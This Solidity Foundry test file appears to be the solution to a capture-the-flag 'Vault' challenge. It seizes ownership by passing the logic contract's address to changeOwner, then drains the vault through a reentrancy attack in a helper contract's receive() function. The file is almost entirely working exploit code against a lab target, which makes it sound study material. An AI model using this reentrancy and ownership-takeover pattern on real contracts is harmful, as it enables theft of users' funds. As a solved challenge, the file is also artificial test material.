// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Vault.sol";

contract ReentrancyAttack {
    Vault private vault;
    
    constructor(address payable _vaultAddress) {
        vault = Vault(_vaultAddress);
    }
    
    function attack() external payable {
        vault.deposite{value: msg.value}();
        vault.withdraw();
        payable(msg.sender).transfer(address(this).balance);
    }
    
    // 重入攻击
    receive() external payable {
        if (address(vault).balance > 0) {
            vault.withdraw();
        }
    }
}

contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;

    address owner = address (1);
    address palyer = address (2);

    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));

        vault.deposite{value: 0.1 ether}();
        vm.stopPrank();

    }
    
    function testExploit() public {
        vm.deal(palyer, 1 ether);
        vm.startPrank(palyer);

        // 首先修改合约owner
        bytes32 logicAddress = bytes32(uint256(uint160(address(logic))));
        
        (bool success,) = address(vault).call(
            abi.encodeWithSignature("changeOwner(bytes32,address)", logicAddress, palyer)
        );
        
        vault.openWithdraw();

        ReentrancyAttack attacker = new ReentrancyAttack(payable(address(vault)));
        
        attacker.attack{value: 0.01 ether}();

        require(vault.isSolve(), "solved");
        vm.stopPrank();
    }
}